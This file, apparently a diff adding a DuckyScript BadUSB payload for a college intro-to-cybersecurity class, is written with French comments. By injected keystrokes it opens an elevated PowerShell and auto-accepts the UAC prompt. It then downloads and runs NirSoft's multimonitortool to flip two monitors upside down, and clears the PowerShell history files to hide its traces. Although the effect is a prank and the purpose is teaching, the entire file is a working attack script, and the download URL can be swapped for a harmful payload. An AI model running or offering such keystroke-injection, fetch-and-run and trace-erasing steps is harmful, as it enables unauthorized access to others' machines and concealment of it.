@@ -1,0 +1,81 @@
+REM #############################################################
+REM #                                                           #
+REM # Démo BadUSB pour le cours 3U4 intro à la cybersécurité    #
+REM # ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯    #
+REM # Ce script démarre PowerShell et télécharge l'outil        #
+REM # multimonitortool de NirSoft, puis utilise cet outil pour  #
+REM # inverser l'orientation des 2 premiers moniteurs           #
+REM # puis efface ses traces.                                   #
+REM #                                                           #
+REM # Auteurs : Vincent Carrier, CÉGEP Montpetit (flipper)      #
+REM #           Joris Deguet pour RubberDucky                   #
+REM # Version : 2.0                                             #
+REM #                                                           #
+REM #############################################################
+
+REM On met le layout de keyboard a US pour ne pas avoir de problème de frappes clavier qui correspond pas
+REM Depuis https://medium.com/confessions-of-el/rubber-ducky-against-non-english-environments-9161504e26f0
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING powershell New-WinUserLanguageList en-US
+STRING powershell Set-WinUserLanguageList -LanguageList en-US
+
+REM Les touches WIN+R ouvrent la commande Exécuter
+
+DELAY 250
+GUI r
+DELAY 250
+
+REM Démarrage d'une fenêtre PowerShell
+STRING PowerShell
+ENTER
+DELAY 250
+
+REM Passe-passe pour faire un slash avec clavier fr-CA TODO enlever vu qu<on passe en clavier US ...
+STRING $slash = '/'
+ENTER
+
+REM Téléchargement du programme
+STRING $ProgressPreference = 'SilentlyContinue'
+ENTER
+STRING $Url = 'https:\\www.nirsoft.net\utils\multimonitortool-x64.zip'.replace('\',$slash)
+ENTER
+STRING $Dest = Join-Path $env:temp 'multimonitortool-x64.zip'
+ENTER
+DELAY 250
+STRING Invoke-WebRequest -Uri $Url -OutFile $Dest
+ENTER
+
+REM Extraction du programme
+DELAY 250
+STRING Expand-Archive $Dest $env:temp -Force
+ENTER
+
+REM Exécution de l'attaque
+STRING $ExePath = Join-Path $env:temp 'multimonitortool.exe'
+ENTER
+STRING $arguments = '\setorientation 1 180'.replace('\',$slash)
+ENTER
+DELAY 250
+STRING Start-Process -FilePath $ExePath -ArgumentList $arguments -Wait -PassThru
+ENTER
+DELAY 250
+STRING $arguments = '\setorientation 2 180'.replace('\',$slash)
+ENTER
+STRING Start-Process -FilePath $ExePath -ArgumentList $arguments -Wait -PassThru
+ENTER
+
+REM Nettoyage
+DELAY 250
+STRING Clear-History
+ENTER
+DELAY 250
+STRING Clear-Content (Get-PSReadLineOption).HistorySavePath
+ENTER
+DELAY 250
+ALT F4
